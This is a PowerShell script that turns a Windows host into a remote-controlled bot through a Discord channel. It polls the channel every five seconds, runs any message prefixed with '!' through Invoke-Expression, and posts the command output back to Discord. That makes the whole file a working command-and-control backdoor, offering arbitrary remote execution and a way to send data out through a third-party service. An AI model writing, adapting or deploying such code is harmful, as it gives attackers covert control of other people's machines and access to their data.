# Define hardcoded token, channelId, botUserId, and baseUrl
$channelId = "1282419492533698651"
$botUserId = "1282419666022563975"  # Hardcoded bot user ID
$baseUrl = "https://discord.com/api/v10"

# Create a reusable HttpClient
Add-Type -AssemblyName System.Net.Http
$client = New-Object System.Net.Http.HttpClient

# Set the Authorization header for all requests
$client.DefaultRequestHeaders.Authorization = "Bot $token"
$client.DefaultRequestHeaders.Accept.Add("application/json")

# Variable to store the latest message ID processed
$global:lastMessageId = $null

# Function to send a message to Discord
function Send-DiscordMessage {
    param (
        [string]$Message
    )

    # Create request body as JSON
    $body = @{
        "content" = $Message
    } | ConvertTo-Json

    # Create StringContent for HTTP Post request
    $content = New-Object System.Net.Http.StringContent($body, [System.Text.Encoding]::UTF8, "application/json")

    # Send the POST request to Discord
    try {
        $response = $client.PostAsync("$baseUrl/channels/$channelId/messages", $content).Result
        if ($response.IsSuccessStatusCode) {
            Write-Host "Message sent successfully."
        } else {
            Write-Host "Error sending message. Status code: $($response.StatusCode)"
            $responseContent = $response.Content.ReadAsStringAsync().Result
            Write-Host "Response: $responseContent"
        }
    } catch {
        Write-Host "Error sending message: $_"
    }
}

# Function to execute any command sent via Discord
function Execute-Command {
    param (
        [string]$command
    )

    try {
        # Run the command
        $output = Invoke-Expression $command

        if ($output) {
            $result = $output -join "`n"  # Join multiline output for Discord message
        } else {
            $result = "Command executed successfully with no output."
        }
    } catch {
        $result = "Error executing command: $_"
    }

    # Send the output to Discord
    Send-DiscordMessage -Message $result
}

# Function to get messages from Discord
function Get-DiscordMessages {
    try {
        # Add limit to fetch the most recent messages
        $response = $client.GetAsync("$baseUrl/channels/$channelId/messages?limit=10").Result
        if ($response.IsSuccessStatusCode) {
            $content = $response.Content.ReadAsStringAsync().Result
            return $content | ConvertFrom-Json
        } else {
            Write-Host "Error fetching messages. Status code: $($response.StatusCode)"
            $responseContent = $response.Content.ReadAsStringAsync().Result
            Write-Host "Response: $responseContent"
            return $null
        }
    } catch {
        Write-Host "Error fetching messages: $_"
        return $null
    }
}

# Function to filter out old messages and only process new ones
function Filter-NewMessages {
    param (
        [array]$messages
    )

    $newMessages = @()
    foreach ($message in $messages) {
        # If there is no last processed message ID, set it to the first one we encounter
        if (-not $global:lastMessageId) {
            $global:lastMessageId = $message.id
            continue
        }

        # Only add messages that are more recent than the last processed one
        if ($message.id -gt $global:lastMessageId) {
            $newMessages += $message
            $global:lastMessageId = $message.id  # Update last processed message ID
        }
    }
    return $newMessages
}

# Main loop with rate limiting and command filtering
while ($true) {
    $messages = Get-DiscordMessages

    if ($messages) {
        $newMessages = Filter-NewMessages -messages $messages

        foreach ($message in $newMessages) {
            # Process only if it's not sent by the bot itself
            if ($message.author.id -ne $botUserId) {
                if ($message.content.StartsWith("!")) {
                    $command = $message.content.Substring(1)  # Remove the "!" but do not convert to lowercase
                    Execute-Command -command $command
                }
            }
        }
    }

    Start-Sleep -Seconds 5
}
